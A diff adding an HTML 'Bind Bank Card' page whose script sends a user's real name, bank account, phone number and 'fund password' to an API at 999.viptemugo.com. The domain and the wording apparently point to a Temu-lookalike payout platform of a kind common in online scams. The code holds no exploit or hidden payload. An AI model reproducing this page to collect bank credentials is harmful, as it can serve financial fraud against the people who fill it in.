@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BIND Bank Card</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #8b0000 0%, #c41e3a 100%);
+            color: white;
+            padding: 10px 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .profile-icon {
+            width: 35px;
+            height: 35px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .content {
+            padding: 30px 20px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            background: #fafafa;
+            transition: all 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #8b0000;
+            background: white;
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            padding-right: 35px;
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #8b0000 0%, #c41e3a 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(139, 0, 0, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.6;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            color: #8b0000;
+        }
+
+        .error-message {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+        }
+
+        .success-message {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="window.history.back()">‹</button>
+                <div class="header-title">BIND BANK CARD</div>
+            </div>
+            <div class="profile-icon">👤</div>
+        </div>
+
+        <div class="content">
+            <h2 class="section-title">YOUR BANK CARD INFORMATION</h2>
+
+            <div class="error-message" id="errorMessage"></div>
+            <div class="success-message" id="successMessage"></div>
+            <div class="loading" id="loading">Loading bank details...</div>
+
+            <form id="bankForm">
+                <div class="form-group">
+                    <label class="form-label">Bank list</label>
+                    <select class="form-control" id="bankSelect" required>
+                        <option value="">select bank</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">real name</label>
+                    <input type="text" class="form-control" id="realName" placeholder="" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Bank A/C</label>
+                    <input type="text" class="form-control" id="bankAccount" placeholder="" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">contact number</label>
+                    <input type="tel" class="form-control" id="contactNumber" placeholder="" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Please enter the fund password</label>
+                    <input type="password" class="form-control" id="fundPassword" placeholder="" required>
+                </div>
+
+                <button type="submit" class="submit-btn">CONFIRM MODIFICATION</button>
+
+                <p class="info-text">
+                    Please enter the correct bank AC number and the IFSC number to which the bank AC is tied, and fill in your real name and real mobile phone number, otherwise the payment will not arrive
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const API_BASE_URL = 'https://999.viptemugo.com';
+        const BANK_DETAILS_API = `${API_BASE_URL}/index/my/bind_bank_details`;
+        const BIND_BANK_API = `${API_BASE_URL}/index/my/bind_bank`;
+
+        // Get stored user data (you may need to adjust this based on your authentication system)
+        let csrf_token = '';
+        let user_id = '';
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Try to get token and user_id from localStorage, sessionStorage, or cookies
+            csrf_token = localStorage.getItem('csrf_token') || sessionStorage.getItem('csrf_token') || getCookie('csrf_token') || '';
+            user_id = localStorage.getItem('user_id') || sessionStorage.getItem('user_id') || getCookie('user_id') || '';
+
+            loadBankDetails();
+        });
+
+        // Helper function to get cookie
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return '';
+        }
+
+        // Load bank details
+        async function loadBankDetails() {
+            const loading = document.getElementById('loading');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            loading.style.display = 'block';
+            errorMessage.style.display = 'none';
+
+            try {
+                const response = await fetch(BANK_DETAILS_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        _token_: csrf_token,
+                        user_id: user_id,
+                    })
+                });
+
+                const data = await response.json();
+
+                console.log('====================================');
+                console.log(data,"data");
+                console.log('====================================');
+                
+                if (data.code === 0 || data.data) {
+                    populateBankList(data.data);
+                } else {
+                    showError(data.message || 'Failed to load bank details');
+                }
+            } catch (error) {
+                console.error('Error loading bank details:', error);
+                showError('Network error. Please try again.');
+            } finally {
+                loading.style.display = 'none';
+            }
+        }
+
+        // Populate bank dropdown
+        function populateBankList(data) {
+            const bankSelect = document.getElementById('bankSelect');
+            
+            // Clear existing options except the first one
+            bankSelect.innerHTML = '<option value="">select bank</option>';
+
+            // Add bank options (adjust based on actual API response structure)
+            if (data.banks && Array.isArray(data.banks)) {
+                data.banks.forEach(bank => {
+                    const option = document.createElement('option');
+                    option.value = bank.code || bank.id;
+                    option.textContent = bank.name;
+                    bankSelect.appendChild(option);
+                });
+            } else if (data.bank_list && Array.isArray(data.bank_list)) {
+                data.bank_list.forEach(bank => {
+                    const option = document.createElement('option');
+                    option.value = bank.number;
+                    option.textContent = bank.bankname;
+                    bankSelect.appendChild(option);
+                });
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('bankForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            const submitBtn = e.target.querySelector('.submit-btn');
+
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+
+            // Get form values
+            const formData = {
+                bank_code: document.getElementById('bankSelect').value,
+                username: document.getElementById('realName').value,
+                id_number: document.getElementById('bankAccount').value,
+                tel: document.getElementById('contactNumber').value,
+                paypassword: document.getElementById('fundPassword').value,
+                _token_: csrf_token,
+                user_id: user_id
+            };
+
+            // Validate
+            if (!formData.bank_code) {
+                showError('Please select a bank');
+                return;
+            }
+
+            // Disable submit button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            try {
+                const response = await fetch(BIND_BANK_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                const data = await response.json();
+
+                if (data.code === 0 || data.info === 'operation completed') {
+                    showSuccess(data.info || 'Bank card bound successfully!');
+                    // Optionally redirect after success
+                    setTimeout(() => {
+                        window.history.back();
+                    }, 2000);
+                } else {
+                    showError(data.info || 'Failed to bind bank card');
+                }
+            } catch (error) {
+                console.error('Error binding bank card:', error);
+                showError('Network error. Please try again.');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'CONFIRM MODIFICATION';
+            }
+        });
+
+        // Helper functions
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            
+            // Scroll to top to show error
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showSuccess(message) {
+            const successMessage = document.getElementById('successMessage');
+            successMessage.textContent = message;
+            successMessage.style.display = 'block';
+            
+            // Scroll to top to show success
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
